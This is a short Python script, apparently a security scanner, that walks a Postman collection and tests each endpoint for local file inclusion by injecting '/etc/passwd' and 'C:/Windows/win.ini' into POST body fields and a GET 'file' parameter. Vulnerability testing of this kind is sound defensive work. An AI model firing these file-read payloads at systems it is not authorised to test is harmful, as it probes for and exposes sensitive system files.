import json
import requests
import argparse

def load_postman_collection(file_path):
    with open(file_path, 'r') as file:
        return json.load(file)

def find_lfi_vulnerabilities(collection):
    lfi_payloads = [
        {"payload": "/etc/passwd", "indicator": "root"},
        {"payload": "C:/Windows/win.ini", "indicator": "16-bit"}
    ]

    for item in collection['item']:
        request = item['request']
        url = request['url']['raw']
        method = request['method']

        if method == "POST" and request['header']:
            headers = {header['key']: header['value'] for header in request['header']}
            if 'Content-Type' in headers and headers['Content-Type'] == 'application/json':
                body = json.loads(request['body']['raw'])
                for key in body:
                    original_value = body[key]
                    for payload in lfi_payloads:
                        body[key] = payload["payload"]
                        response = requests.post(url, headers=headers, json=body)
                        if payload["indicator"] in response.text:
                            print(f"LFI vulnerability detected at {url} in parameter {key} using payload {payload['payload']}")
                        body[key] = original_value
        elif method == "GET":
            for payload in lfi_payloads:
                response = requests.get(url, params={"file": payload["payload"]})
                if payload["indicator"] in response.text:
                    print(f"LFI vulnerability detected at {url} using payload {payload['payload']}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check for Local File Inclusion (LFI) vulnerabilities in a Postman collection.")
    parser.add_argument('-f', '--file', required=True, help="Path to the Postman collection file")
    args = parser.parse_args()

    collection_file_path = args.file
    collection = load_postman_collection(collection_file_path)
    find_lfi_vulnerabilities(collection)
